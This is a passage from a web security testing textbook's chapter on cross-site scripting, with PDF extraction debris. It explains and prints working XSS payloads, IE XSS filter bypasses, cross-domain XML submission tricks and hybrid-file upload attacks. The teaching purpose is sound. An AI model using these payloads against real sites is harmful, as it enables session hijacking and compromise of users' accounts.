It returns a page containing the following:
<input type=‚Äùhidden‚Äù name=‚Äùpage_id‚Äù value=‚Äù244‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùseed‚Äù value=‚Äù129402931‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùmode‚Äù value=‚Äùnormal‚Äù>
c12.indd 471 c12.indd 471 8/19/2011 12:12:31 PM 8/19/2011 12:12:31 PM
Stuttard c12.indd V2 - 08/10/2011 Page 472
472 Chapter 12 n Attacking Users: Cross-Site Scripting 
Suppose that each fi eld has length restrictions, such that no feasible attack 
string can be inserted into any of them. Nevertheless, you can still deliver a 
working exploit by using the following URL to span a script across the three 
locations you control:
https://myapp.com/account.php?page_id=‚Äù><script>/*&seed=*/alert(document
.cookie);/*&mode=*/</script>
When the parameter values from this URL are embedded into the page, the 
result is the following:
<input type=‚Äùhidden‚Äù name=‚Äùpage_id‚Äù value=‚Äù‚Äù><script>/*‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùseed‚Äù value=‚Äù*/alert(document.cookie);/*‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùmode‚Äù value=‚Äù*/</script>‚Äù>
The resulting HTML is valid and is equivalent to only the portions in bold. 
The chunks of source code in between have effectively become JavaScript comments (surrounded by the /* and */ markers), so the browser ignores them. 
Hence, your script is executed just as if it had been inserted whole at one location within the page.
TIP The technique of spanning an attack payload across multiple fi elds can 
sometimes be used to beat other types of defensive fi lters. It is fairly common 
to fi nd different data validation and sanitization being implemented on different fi elds within a single page of an application. In the previous example, suppose that the page_id and mode parameters are subject to a maximum length 
of 12 characters. Because these fi elds are so short, the application‚Äôs developers 
did not bother to implement any XSS fi lters. The seed parameter, on the other 
hand, is unrestricted in length, so rigorous fi lters were implemented to prevent 
the injection of the characters ‚Äú < or >. In this scenario, despite the developers‚Äô 
efforts, it is still possible to insert an arbitrarily long script into the seed parameter without employing any of the blocked characters, because the JavaScript 
context can be created by data injected into the surrounding fi elds.
A third technique for beating length limits, which can be highly effective 
in some situations, is to ‚Äúconvert‚Äù a refl ected XSS fl aw into a DOM-based 
vulnerability. For example, in the original refl ected XSS vulnerability, if the 
application places a length restriction on the message parameter that is copied into the returned page, you can inject the following 45-byte script, which 
evaluates the fragment string in the current URL:
<script>eval(location.hash.slice(1))</script>
By injecting this script into the parameter that is vulnerable to refl ected XSS, 
you can effectively induce a DOM-based XSS vulnerability in the resulting page 
c12.indd 472 c12.indd 472 8/19/2011 12:12:31 PM 8/19/2011 12:12:31 PM
Stuttard c12.indd V2 - 08/10/2011 Page 473
 Chapter 12 n Attacking Users: Cross-Site Scripting 473
and thus execute a second script located within the fragment string, which is 
outside the control of the application‚Äôs fi lters and may be arbitrarily long. For 
example:
http://mdsec.net/error/5/Error.ashx?message=<script>eval(location.hash
.substr(1))</script>#alert(‚Äòlong script here ......‚Äô)
Here is an even shorter version that works in most situations:
http://mdsec.net/error/5/Error.ashx?message=<script>eval(unescape(location))
</script>#%0Aalert(‚Äòlong script here ......‚Äô)
In this version, the whole of the URL is URL-decoded and then passed to the 
eval command. The whole URL executes as valid JavaScript because the http:
protocol prefi x serves as a code label, the // following the protocol prefi x serves 
as a single-line comment, and the %0A is URL-decoded to become a newline, 
signaling the end of the comment.
Delivering Working XSS Exploits
Typically, when you are working on a potential XSS vulnerability to understand 
and bypass the application‚Äôs fi lters, you are working outside the browser, using 
a tool such as Burp Repeater to send the same request repeatedly, modifying 
the request in small ways each time, and testing the effect on the response. In 
some situations, after you have created a proof-of-concept attack in this way, 
you still may have work to do in order to deliver a practical attack against other 
application users. For example, the entry point for the XSS may be nontrivial to 
control in other users‚Äô requests, such as a cookie or the Referer header. Or the 
target users may be using a browser with built-in protection against refl ected 
XSS attacks. This section examines various challenges that may arise when 
delivering working XSS exploits in practice and how they can be circumvented.
Escalating an Attack to Other Application Pages
Suppose the vulnerability you have identifi ed is in an uninteresting area of the 
application, affecting only unauthenticated users, and a different area contains 
the really sensitive data and functionality you want to compromise.
In this situation, it is normally fairly easy to devise an attack payload that 
you can deliver via the XSS bug in one area of the application and that persists 
within the user‚Äôs browser to compromise the victim anywhere he goes on the 
same domain.
One simple method of doing this is for the exploit to create an iframe covering the whole browser window and reload the current page within the iframe. 
As the user navigates through the site and logs in to the authenticated area, 
the injected script keeps running in the top-level window. It can hook into all 
c12.indd 473 c12.indd 473 8/19/2011 12:12:31 PM 8/19/2011 12:12:31 PM
Stuttard c12.indd V2 - 08/10/2011 Page 474
474 Chapter 12 n Attacking Users: Cross-Site Scripting 
navigation events and form submissions in the child iframe, monitor all response 
content appearing in the iframe, and, of course, hijack the user‚Äôs session when 
the moment is right. In HTML5-capable browsers, the script can even set the 
appropriate URL in the location bar as the user moves between pages, using 
the window.history.pushState() function.
For one example of this kind of exploit, see this URL:
http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html
COMMON MYTH
‚ÄúWe‚Äôre not worried about any XSS bugs in the unauthenticated part of our 
site. They can‚Äôt be used to hijack sessions.‚Äù
This thought is erroneous for two reasons. First, an XSS bug in the unauthenticated part of an application normally can be used to directly compromise the sessions of authenticated users. Hence, an unauthenticated refl ected 
XSS fl aw typically is more serious than an authenticated one, because the 
scope of potential victims is wider. Second, even if a user is not yet authenticated, an attacker can deploy some Trojan functionality that persists in the 
victim‚Äôs browser across multiple requests, waiting until the victim logs in, and 
then hijacking the resulting session. It is even possible to capture a user‚Äôs 
password using a keylogger written in JavaScript, as described in Chapter 13.
Modifying the Request Method
Suppose that the XSS vulnerability you have identifi ed uses a POST request, but the 
most convenient method for delivering an attack requires the GET method ‚Äî for 
example, by submitting a forum post containing an IMG tag targeting the vulnerable URL.
In these cases, it is always worth verifying whether the application handles 
the request in the same way if it is converted to a GET request. Many applications 
tolerate requests in either form.
In Burp Suite, you can use the ‚Äúchange request method‚Äù command on the 
context menu to toggle any request between the GET and POST methods.
COMMON MYTH
‚ÄúThis XSS bug isn‚Äôt exploitable. I can‚Äôt get my attack to work as a GET
request.‚Äù
If a refl ected XSS fl aw can only be exploited using the POST method, the 
application is still vulnerable to various attack delivery mechanisms, including 
ones that employ a malicious third-party website.
c12.indd 474 c12.indd 474 8/19/2011 12:12:31 PM 8/19/2011 12:12:31 PM
Stuttard c12.indd V2 - 08/10/2011 Page 475
 Chapter 12 n Attacking Users: Cross-Site Scripting 475
In some situations, the opposite technique can be useful. Converting an attack that 
uses the GET method into one that uses the POST method may enable you to bypass 
certain fi lters. Many applications perform some generic application-wide fi ltering 
of requests for known attack strings. If an application expects to receive requests 
using the GET method, it may perform this fi ltering on the URL query string only. By 
converting a request to use the POST method, you may be able to bypass this fi lter.
Exploiting XSS Via Cookies
Some applications contain refl ected XSS vulnerabilities for which the entry point 
for the attack is within a request cookie. In this situation, you may be able to 
use various techniques to exploit the vulnerability:
n As with modifying the request method, the application may allow you to 
use a URL or body parameter with the same name as the cookie to trigger 
the vulnerability.
n If the application contains any functionality that allows the cookie‚Äôs value 
to be set directly (for example, a preferences page that sets cookies based 
on submitted parameter values), you may be able to devise a cross-site 
request forgery attack that sets the required cookie in the victim‚Äôs browser. 
Exploiting the vulnerability would then require the victim to be induced 
into making two requests: to set the required cookie containing an XSS 
payload, and to request the functionality where the cookie‚Äôs value is 
processed in an unsafe way.
n Historically, various vulnerabilities have existed in browser extension 
technologies, such as Flash, that have enabled cross-domain requests to be 
issued with arbitrary HTTP headers. Currently at least one such vulnerability is widely known but not yet patched. You could leverage one of 
these vulnerabilities in browser plug-ins to make cross-domain requests 
containing an arbitrary cookie header designed to trigger the vulnerability.
n If none of the preceding methods is successful, you can leverage any other 
refl ected XSS bug on the same (or a related) domain to set a persistent 
cookie with the required value, thereby delivering a permanent compromise of the victim user.
Exploiting XSS in the Referer Header
Some applications contain refl ected XSS vulnerabilities that can only be triggered via the Referer header. These are typically fairly easy to exploit using a 
web server controlled by the attacker. The victim is induced to request a URL 
on the attacker‚Äôs server that contains a suitable XSS payload for the vulnerable 
application. The attacker‚Äôs server returns a response that causes a request to the 
vulnerable URL, and the attacker‚Äôs payload is included in the Referer header 
that is sent with this request.
c12.indd 475 c12.indd 475 8/19/2011 12:12:31 PM 8/19/2011 12:12:31 PM
Stuttard c12.indd V2 - 08/10/2011 Page 476
476 Chapter 12 n Attacking Users: Cross-Site Scripting 
In some situations, the XSS vulnerability is triggered only if the Referer header 
contains a URL on the same domain as the vulnerable application. Here, you 
may be able to leverage any on-site redirector functions within the application 
to deliver your attack. To do this, you need to construct a URL to the redirector 
function that both contains a valid XSS exploit and causes a redirection to the 
vulnerable URL. The success of this attack depends on the redirection method 
the function uses and on whether current browsers update the Referer header 
when following redirections of that type.
Exploiting XSS in Nonstandard Request and Response Content
Today‚Äôs complex applications increasingly employ Ajax requests that do not 
contain traditional request parameters. Instead, requests often contain data in 
formats such as XML and JSON, or employing various serialization schemes. 
Correspondingly, the responses to these requests frequently contain data in the 
same or another format, rather than HTML.
The server-side functionality involved in these requests and responses often 
exhibits XSS-like behavior. Request payloads that normally would indicate the 
presence of a vulnerability are returned unmodifi ed by the application.
In this situation, it is still possible that the behavior can be exploited to deliver 
an XSS attack. To do so, you need to meet two distinct challenges:
n You need to fi nd a means of causing a victim user to make the necessary 
request cross-domain.
n You need to fi nd a way of manipulating the response so that it executes 
your script when consumed by the browser.
Neither of these challenges is trivial. First, the requests in question typically 
are made from JavaScript using XMLHttpRequest (see Chapter 3). By default, 
this cannot be used to make cross-domain requests. Although XMLHttpRequest
is being modifi ed in HTML5 to allow sites to specify other domains that may 
interact with them, if you fi nd a target that allows third-party interaction, there 
are probably simpler ways for you to compromise it (see Chapter 13).
Second, in any attack, the response returned by the application would be consumed directly by the victim‚Äôs browser, not by the custom script that processes 
it in its original context. The response will contain data in whatever non-HTML 
format is being used, usually with the corresponding Content-Type header. In 
this situation, the browser processes the response in the normal way for this 
data type (if recognized), and normal methods for introducing script code via 
HTML may be irrelevant.
Although nontrivial, in some situations both of these challenges can be 
met, allowing the XSS-like behavior to be exploited to deliver a working 
attack. We will examine how this can be done using the XML data format 
as an example.
c12.indd 476 c12.indd 476 8/19/2011 12:12:32 PM 8/19/2011 12:12:32 PM
Stuttard c12.indd V2 - 08/10/2011 Page 477
 Chapter 12 n Attacking Users: Cross-Site Scripting 477
Sending XML Requests Cross-Domain
It is possible to send near-arbitrary data cross-domain within the HTTP request 
body by using an HTML form with the enctype attribute set to text/plain. This 
tells the browser to handle the form parameters in the following way:
n Send each parameter on a separate line within the request.
n Use an equals sign to separate the name and value of each parameter (as 
normal).
n Do not perform any URL encoding of parameter names or values.
Although some browsers do not honor this specifi cation, it is properly honored 
by current versions of Internet Explorer, Firefox, and Opera.
The behavior described means that you can send arbitrary data in the message 
body, provided that there is at least one equals sign anywhere within the data. To 
do this, you split the data into two chunks, before and after the equals sign. You 
place the fi rst chunk into a parameter name and the second chunk into a parameter 
value. When the browser constructs the request, it sends the two chunks separated 
by an equals sign, thereby exactly constructing the required data.
Since XML always contains at least one equals sign, in the version attribute of 
the opening XML tag, we can use this technique to send arbitrary XML data crossdomain in the message body. For example, if the required XML were as follows:
<?xml version=‚Äù1.0‚Äù?><data><param>foo</param></data>
we could send this using the following form:
<form enctype=‚Äùtext/plain‚Äù action=‚Äùhttp://wahh-app.com/ vuln.php‚Äù 
method=‚ÄùPOST‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äô<?xml version‚Äô
value=‚Äô‚Äù1.0‚Äù?><data><param>foo</param></data>‚Äô>
 </form><script>document.forms[0].submit();</script>
To include common attack characters within the value of the param parameter, 
such as tag angle brackets, these would need to be HTML-encoded within the 
XML request. Therefore, they would need to be double HTML-encoded within 
the HTML form that generates that request.
TIP You can use this technique to submit cross-domain requests containing 
virtually any type of content, such as JSON-encoded data and serialized binary 
objects, provided you can incorporate the equals character somewhere within 
the request. This is normally possible by modifying a free-form text fi eld within 
the request that can contain an equals character. For example in the following 
JSON data, the comment fi eld is used to introduce the required equals character:
{ ‚Äúname‚Äù: ‚ÄúJohn‚Äù, ‚Äúemail‚Äù: ‚Äúgomad@diet.com‚Äù, ‚Äúcomment‚Äù: ‚Äú=‚Äù }
c12.indd 477 c12.indd 477 8/19/2011 12:12:32 PM 8/19/2011 12:12:32 PM
Stuttard c12.indd V2 - 08/10/2011 Page 478
478 Chapter 12 n Attacking Users: Cross-Site Scripting 
The only signifi cant caveat to using this technique is that the resulting request 
will contain the following header:
Content-Type: text/plain
The original request normally would have contained a different Content-Type
header, depending on exactly how it was generated. If the application tolerates 
the supplied Content-Type header and processes the message body in the normal 
way, the technique can be used successfully when trying to develop a working 
XSS exploit. If the application fails to process the request in the normal way, on 
account of the modifi ed Content-Type header, there may be no way to send a 
suitable cross-domain request to trigger the XSS-like behavior.
TIP If you identify XSS-like behavior in a request that contains nonstandard 
content, the fi rst thing you should do is quickly verify whether the behavior 
remains when you change the Content-Type header to text/plain. If it 
does not, it may not be worth investing any further effort in trying to develop 
a working XSS exploit.
Executing JavaScript from Within XML Responses
The second challenge to overcome when attempting to exploit XSS-like behavior in nonstandard content is to fi nd a way of manipulating the response so 
that it executes your script when consumed directly by the browser. If the 
response contains an inaccurate Content-Type header, or none at all, or if your 
input is being refl ected right at the start of the response body, this task may be 
straightforward.
Usually, however, the response includes a Content-Type header that accurately describes the type of data that the application returns. Furthermore, your 
input typically is refl ected partway through the response, and the bulk of the 
response before and after this point will contain data that complies with the 
relevant specifi cations for the stated content type. Different browsers take different approaches to parsing content. Some simply trust the Content-Type header, 
and others inspect the content itself and are willing to override the stated type 
if the actual type appears different. In this situation, however, either approach 
makes it highly unlikely that the browser will process the response as HTML.
If it is possible to construct a response that does succeed in executing a script, this 
normally involves exploiting some particular syntactic feature of the type of content 
that is being injected into. Fortunately, in the case of XML, this can be achieved by 
using XML markup to defi ne a new namespace that is mapped to XHTML, causing 
the browser to parse uses of that namespace as HTML. For example, when Firefox 
processes the following response, the injected script is executed:
HTTP/1.1 200 Ok
Content-Type: text/xml
c12.indd 478 c12.indd 478 8/19/2011 12:12:32 PM 8/19/2011 12:12:32 PM
Stuttard c12.indd V2 - 08/10/2011 Page 479
 Chapter 12 n Attacking Users: Cross-Site Scripting 479
Content-Length: 1098
<xml>
<data>
...
<a xmlns:a=‚Äôhttp://www.w3.org/1999/xhtml‚Äô>
<a:body onload=‚Äôalert(1)‚Äô/></a>
...
</data>
</xml>
As mentioned, this exploit succeeds when the response is consumed directly 
by the browser, and not by the original application component that would ordinarily process the response.
Attacking Browser XSS Filters
One obstacle to the practical exploitation of virtually any refl ected XSS vulnerability arises from various browser features that attempt to protect users from 
precisely these attacks. Current versions of the Internet Explorer browser include 
an XSS fi lter by default, and similar features are available as plug-ins to several 
other browsers. These fi lters all work in a similar way: they passively monitor 
requests and responses, use various rules to identify possible XSS attacks in 
progress, and, when a possible attack is identifi ed, modify parts of the response 
to neutralize the possible attack.
Now, as we have discussed, XSS conditions should be considered vulnerabilities if they can be exploited via any browser in widespread usage, and the 
presence of XSS fi lters in some browsers does not mean that XSS vulnerabilities 
do not need to be fi xed. Nevertheless, in some practical situations, an attacker 
may specifi cally need to exploit a vulnerability via a browser that implements an 
XSS fi lter. Furthermore, the ways in which XSS fi lters can be circumvented are 
interesting in their own right. In some cases they can be leveraged to facilitate 
the delivery of other attacks that otherwise would be impossible.
This section examines Internet Explorer‚Äôs XSS fi lter. Currently it is the most 
mature and widely adopted fi lter available.
The core operation of the IE XSS fi lter is as follows:
n In cross-domain requests, each parameter value is inspected to identify 
possible attempts to inject JavaScript. This is done by checking the value 
against a regex-based blacklist of common attack strings.
n If a potentially malicious parameter value is found, the response is checked 
to see whether it contains this same value.
n If the value appears in the response, the response is sanitized to prevent 
any script from executing. For example, <script> is modifi ed to become 
<sc#ipt>.
c12.indd 479 c12.indd 479 8/19/2011 12:12:32 PM 8/19/2011 12:12:32 PM
Stuttard c12.indd V2 - 08/10/2011 Page 480
480 Chapter 12 n Attacking Users: Cross-Site Scripting 
The fi rst thing to say about the IE XSS fi lter is that it is generally highly effective in blocking standard exploitation of XSS bugs, considerably raising the bar 
for any attacker who is attempting to perform these attacks. That said, the fi lter 
can be bypassed in some important ways. You can also exploit how the fi lter 
operates to deliver attacks that otherwise would be impossible.
First, some ways of bypassing the fi lter arise from core features of its design:
n Only parameter values are considered, not parameter names. Some applications are vulnerable to trivial attacks via parameter names, such as if 
the whole of the requested URL or query string is echoed in the response. 
These attacks are not prevented by the fi lter.
n Because each parameter value is considered separately, if more than one 
parameter is refl ected in the same response, it may be possible to span an 
attack between the two parameters, as was described as a technique for 
beating length limits. If the XSS payload can be split into chunks, none 
of which individually matches the blacklist of blocked expressions, the 
fi lter does not block the attack.
n Only cross-domain requests are included, for performance reasons. Hence, 
if an attacker can cause a user to make an ‚Äúon-site‚Äù request for an XSS URL, 
the attack is not blocked. This can generally be achieved if the application 
contains any behavior that allows an attacker to inject arbitrary links into a 
page viewed by another user (even if this is itself a refl ected attack; the XSS 
fi lter seeks to block only injected scripts, not injected links). In this scenario, 
the attack requires two steps: the injection of the malicious link into a user‚Äôs 
page, and the user‚Äôs clicking the link and receiving the XSS payload.
Second, some implementation details regarding browser and server behavior 
allow the XSS fi lter to be bypassed in some cases:
n As you have seen, browsers tolerate various kinds of unexpected characters and syntax when processing HTML, such as IE‚Äôs own tolerance of 
NULL bytes. The quirks in IE‚Äôs behavior can sometimes be leveraged to 
bypass its own XSS fi lter.
n As discussed in Chapter 10, application servers behave in various ways 
when a request contains multiple request parameters with the same name. 
In some cases they concatenate all the received values. For example, in 
ASP.NET, if a query string contains:
p1=foo&p1=bar
the value of the p1 parameter that is passed to the application is:
p1=foo,bar
In contrast, the IE XSS fi lter still processes each parameter separately, even 
if they share the same name. This difference in behavior can make it easy 
c12.indd 480 c12.indd 480 8/19/2011 12:12:32 PM 8/19/2011 12:12:32 PM
Stuttard c12.indd V2 - 08/10/2011 Page 481
 Chapter 12 n Attacking Users: Cross-Site Scripting 481
to span an XSS payload across several ‚Äúdifferent‚Äù request parameters with 
the same name, bypassing the blacklist with each separate value, all of 
which the server recombines.
TRY IT!
Currently the following XSS exploit succeeds in bypassing the IE XSS fi lter:
http://mdsec.net/error/5/Error.ashx?message=<scr%00ipt%20
&message=> alert(‚Äòxss‚Äô)</script>
Third, the way in which the fi lter sanitizes script code in application responses 
can actually be leveraged to deliver attacks that otherwise would be impossible. The 
core reason for this is that the fi lter operates passively, looking only for correlations 
between script-like inputs and script-like outputs. It cannot interactively probe 
the application to confi rm whether a given piece of input actually causes a given 
piece of output. As a result, an attacker can actually leverage the fi lter to selectively 
neutralize the application‚Äôs own script code that appears within responses. If the 
attacker includes part of an existing script within the value of a request parameter, the IE XSS fi lter sees that the same script code appears in the request and 
the response and modifi es the script in the response to prevent it from executing.
Some situations have been identifi ed where neutralizing an existing script 
changes the syntactic context of a subsequent part of the response that contains 
a refl ection of user input. This change in context may mean that the application‚Äôs 
own fi ltering of the refl ected input is no longer suffi cient. Therefore, the refl ection can be used to deliver an XSS attack in a way that was impossible without 
the changes made by the IE XSS fi lter. However, the situations in which this 
has arisen generally have involved edge cases with unusual features or have 
revealed defects in earlier versions of the IE XSS fi lter that have since been fi xed.
More signifi cantly, an attacker‚Äôs ability to selectively neutralize an application‚Äôs 
own script code could be leveraged to deliver entirely different attacks by interfering 
with an application‚Äôs security-relevant control mechanisms. One generic example 
of this relates to the removal of defensive framebusting code (see Chapter 13), but 
numerous other examples may arise in connection with application-specifi c code 
that performs key defensive security tasks on the client side.
Finding and Exploiting Stored XSS Vulnerabilities
The process of identifying stored XSS vulnerabilities overlaps substantially 
with that described for refl ected XSS. It includes submitting a unique string in 
every entry point within the application. However, you must keep in mind some 
important differences to maximize the number of vulnerabilities identifi ed.
c12.indd 481 c12.indd 481 8/19/2011 12:12:33 PM 8/19/2011 12:12:33 PM
Stuttard c12.indd V2 - 08/10/2011 Page 482
482 Chapter 12 n Attacking Users: Cross-Site Scripting 
HACK STEPS
 1. Having submitted a unique string to every possible location within the 
application, you must review all of the application‚Äôs content and functionality once more to identify any instances where this string is displayed 
back to the browser. User-controllable data entered in one location (for 
example, a name field on a personal information page) may be displayed 
in numerous places throughout the application. (For example, it could 
be on the user‚Äôs home page, in a listing of registered users, in work flow 
items such as tasks, on other users‚Äô contact lists, in messages or questions posted by the user, or in application logs.) Each appearance of the 
string may be subject to different protective filters and therefore needs to 
be investigated separately.
 2. If possible, all areas of the application accessible by administrators 
should be reviewed to identify the appearance of any data controllable by 
non-administrative users. For example, the application may allow administrators to review log files in-browser. It is extremely common for this 
type of functionality to contain XSS vulnerabilities that an attacker can 
exploit by generating log entries containing malicious HTML.
 3. When submitting a test string to each location within the application, it is 
sometimes insufficient simply to post it as each parameter to each page. 
Many application functions need to be followed through several stages 
before the submitted data is actually stored. For example, actions such 
as registering a new user, placing a shopping order, and making a funds 
transfer often involve submitting several different requests in a defined 
sequence. To avoid missing any vulnerabilities, it is necessary to see each 
test case through to completion.
 4. When probing for reflected XSS, you are interested in every aspect of a 
victim‚Äôs request that you can control. This includes all parameters to the 
request, every HTTP header, and so on. In the case of stored XSS, you 
should also investigate any out-of-band channels through which the 
application receives and processes input you can control. Any such channels are suitable attack vectors for introducing stored XSS attacks. Review 
the results of your application mapping exercises (see Chapter 4) to identify every possible area of attack surface.
 5. If the application allows files to be uploaded and downloaded, always 
probe this functionality for stored XSS attacks. Detailed techniques for 
testing this type of functionality are discussed later in this chapter.
 6. Think imaginatively about any other possible means by which data you 
control may be stored by the application and displayed to other users. For 
example, if the application search function shows a list of popular search 
items, you may be able to introduce a stored XSS payload by searching 
for it numerous times, even though the primary search functionality itself 
handles your input safely.
c12.indd 482 c12.indd 482 8/19/2011 12:12:33 PM 8/19/2011 12:12:33 PM
Stuttard c12.indd V2 - 08/10/2011 Page 483
 Chapter 12 n Attacking Users: Cross-Site Scripting 483
When you have identifi ed every instance in which user-controllable data is 
stored by the application and later displayed back to the browser, you should 
follow the same process described previously for investigating potential refl ected 
XSS vulnerabilities. That is, determine what input needs to be submitted to 
embed valid JavaScript within the surrounding HTML, and then attempt to 
circumvent any fi lters that interfere with the processing of your attack payload.
TIP When probing for refl ected XSS, it is easy to identify which request 
parameters are potentially vulnerable. You can test one parameter at a time 
and review each response for any appearance of your input. With stored XSS, 
however, this may be less straightforward. If you submit the same test string 
as every parameter to every page, you may fi nd this string reappearing at 
multiple locations within the application. It may not be clear from the context 
precisely which parameter is responsible for the appearance. To avoid this 
problem, you can submit a different test string as every parameter when probing for stored XSS fl aws. For example, you can concatenate your unique string 
with the name of the fi eld it is being submitted to.
Some specifi c techniques are applicable when testing for stored XSS vulnerabilities in particular types of functionality. The following sections examine 
some of these in more detail.
Testing for XSS in Web Mail Applications
As we have discussed, web mail applications are inherently at risk of containing stored XSS vulnerabilities, because they include HTML content received 
directly from third parties within application pages that are displayed to users. 
To test this functionality, ideally you should obtain your own e-mail account 
on the application, send various XSS exploits in e-mail messages to yourself, 
and view each message within the application to determine whether any of the 
exploits are successful.
To perform this task in a thorough manner, you need to send all kinds of 
unusual HTML content within e-mails, as we described to test for bypasses in 
input fi lters. If you restrict yourself to using a standard e-mail client, you will 
likely fi nd that you have insuffi cient control over the raw message content, or 
the client may itself sanitize or ‚Äúclean up‚Äù your deliberately malformed syntax.
In this situation, it is generally preferable to use an alternative means of generating e-mails that gives you direct control over the contents of messages. One 
method of doing this is using the UNIX sendmail command. You need to have 
confi gured your computer with the details of the mail server it should use to 
send outgoing mail. Then you can create your raw e-mail in a text editor and 
send it using this command:
sendmail -t test@example.org < email.txt
c12.indd 483 c12.indd 483 8/19/2011 12:12:33 PM 8/19/2011 12:12:33 PM
Stuttard c12.indd V2 - 08/10/2011 Page 484
484 Chapter 12 n Attacking Users: Cross-Site Scripting 
The following is an example of a raw e-mail fi le. As well as testing various 
XSS payloads and fi lter bypasses in the message body, you can also try specifying a different Content-Type and charset:
MIME-Version: 1.0
From: test@example.org
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: 7bit
Subject: XSS test
<html>
<body>
<img src=``onerror=alert(1)>
</body>
</html>
.
Testing for XSS in Uploaded Files
One common, but frequently overlooked, source of stored XSS vulnerabilities 
arises where an application allows users to upload fi les that can be downloaded 
and viewed by other users. This kind of functionality arises frequently in today‚Äôs 
applications. In addition to traditional work fl ow functions designed for fi le 
sharing, fi les can be sent as e-mail attachments to web mail users. Image fi les 
can be attached to blog entries and can be used as custom profi le pictures or 
shared via photo albums.
Various factors may affect whether an application is vulnerable to uploaded 
fi le attacks:
n During fi le upload, the application may restrict the fi le extensions that 
can be used.
n During fi le upload, the application may inspect the fi le‚Äôs contents to confi rm that this complies with an expected format, such as JPEG.
n During fi le download, the application may return a Content-Type header 
specifying the type of content that the application believes the fi le contains, 
such as image/jpeg.
n During fi le download, the application may return a Content-Disposition
header that specifi es the browser should save the fi le to disk. Otherwise, 
for relevant content types, the application processes and renders the fi le 
within the user‚Äôs browser.
When examining this functionality, the fi rst thing you should do is try to 
upload a simple HTML fi le containing a proof-of-concept script. If the fi le is 
accepted, try to download the fi le in the usual way. If the original fi le is returned 
unmodifi ed, and your script executes, the application is certainly vulnerable.
c12.indd 484 c12.indd 484 8/19/2011 12:12:33 PM 8/19/2011 12:12:33 PM
Stuttard c12.indd V2 - 08/10/2011 Page 485
 Chapter 12 n Attacking Users: Cross-Site Scripting 485
If the application blocks the uploaded fi le, try to use various fi le extensions, 
including .txt and .jpg. If the application accepts a fi le containing HTML when 
you use a different extension, it may still be vulnerable, depending on exactly 
how the fi le is delivered during download. Web mail applications are often 
vulnerable in this way. An attacker can send e-mails containing a seductivesounding image attachment that in fact compromises the session of any user 
who views it.
Even if the application returns a Content-Type header specifying that the 
downloaded fi le is an image, some browsers may still process its contents as 
HTML if this is what the fi le actually contains. For example:
HTTP/1.1 200 OK
Content-Length: 25
Content-Type: image/jpeg
<script>alert(1)</script>
Older versions of Internet Explorer behaved in this way. If a user requested a 
.jpg fi le directly (not via an embedded <img> tag), and the preceding response 
was received, IE would actually process its contents as HTML. Although this 
behavior has since been modifi ed, it is possible that other browsers may behave 
this way in the future.
Hybrid File Attacks
Often, to defend against the attacks described so far, applications perform 
some validation of the uploaded fi le‚Äôs contents to verify that it actually contains data in the expected format, such as an image. These applications may 
still be vulnerable, using ‚Äúhybrid fi les‚Äù that combine two different formats 
within the same fi le.
One example of a hybrid fi le is a GIFAR fi le, devised by Billy Rios. A GIFAR 
fi le contains data in both GIF image format and JAR (Java archive) format and 
is actually a valid instance of both formats. This is possible because the fi le 
metadata relating to the GIF format is at the start of the fi le, and the metadata 
relating to the JAR format is at the end of the fi le. Because of this, applications 
that validate the contents of uploaded fi les, and that allow fi les containing GIF 
data, accept GIFAR fi les as valid.
An uploaded fi le attack using a GIFAR fi le typically involves the following 
steps:
n The attacker fi nds an application function in which GIF fi les that are 
uploaded by one user can be downloaded by other users, such as a user‚Äôs 
profi le picture in a social networking application.
n The attacker constructs a GIFAR fi le containing Java code that hijacks the 
session of any user who executes it.
c12.indd 485 c12.indd 485 8/19/2011 12:12:33 PM 8/19/2011 12:12:33 PM
Stuttard c12.indd V2 - 08/10/2011 Page 486
486 Chapter 12 n Attacking Users: Cross-Site Scripting 
n The attacker uploads the fi le as his profi le picture. Because the fi le contains 
a valid GIF image, the application accepts it.
n The attacker identifi es a suitable external website from which to deliver 
an attack leveraging the uploaded fi le. This may be the attacker‚Äôs own 
website, or a third-party site that allows authoring of arbitrary HTML, 
such as a blog.
n On the external site, the attacker uses the <applet> or <object> tag to load 
the GIFAR fi le from the social networking site as a Java applet.
n When a user visits the external site, the attacker‚Äôs Java applet executes 
in his browser. For Java applets, the same-origin policy is implemented 
in a different way than for normal script includes. The applet is treated 
as belonging to the domain from which it was loaded, not the domain 
that invoked it. Hence, the attacker‚Äôs applet executes in the domain of the 
social networking application. If the victim user is logged in to the social 
networking application at the time of the attack, or has logged in recently 
and selected the ‚Äústay logged in‚Äù option, the attacker‚Äôs applet has full 
access to the user‚Äôs session, and the user is compromised.
This specifi c attack using GIFAR fi les is prevented in current versions of the 
Java browser plug-in, which validates whether JAR fi les being loaded actually 
contain hybrid content. However, the principle of using hybrid fi les to conceal 
executable code remains valid. Given the growing range of client-executable 
code formats now in use, it is possible that similar attacks may exist in other 
formats or may arise in the future.
XSS in Files Loaded Via Ajax
Some of today‚Äôs applications use Ajax to retrieve and render URLs that are 
specifi ed after the fragment identifi er. For example, an application‚Äôs pages may 
contain links like the following:
http://wahh-app.com/#profile
When the user clicks the link, client-side code handles the click event, uses 
Ajax to retrieve the fi le shown after the fragment, and sets the response within 
the innerHtml of a <div> element in the existing page. This can provide a seamless user experience, in which clicking a tab in the user interface updates the 
displayed content without reloading the entire page.
In this situation, if the application also contains functionality allowing you to 
upload and download image fi les, such as a user profi le picture, you may be able 
to upload a valid image fi le containing embedded HTML markup and construct 
a URL that causes the client-side code to fetch the image and display it as HTML:
http://wahh-app.com/#profiles/images/15234917624.jpg
c12.indd 486 c12.indd 486 8/19/2011 12:12:33 PM 8/19/2011 12:12:33 PM
Stuttard c12.indd V2 - 08/10/2011 Page 487
 Chapter 12 n Attacking Users: Cross-Site Scripting 487
HTML can be embedded in various locations within a valid image fi le, including the comment section of the image. Several browsers, including Firefox and 
Safari, happily render an image fi le as HTML. The binary parts of the image 
are displayed as junk, and any embedded HTML is displayed in the usual way.
TIP Suppose a potential victim is using an HTML5-compliant browser, where 
cross-domain Ajax requests are possible with the permission of the requested 
domain. Another possible attack in this situation would be to place an absolute URL after the fragment character, specifying an external HTML fi le that 
the attacker fully controls, on a server that allows Ajax interaction from the 
domain being targeted. If the client-side script does not validate that the URL 
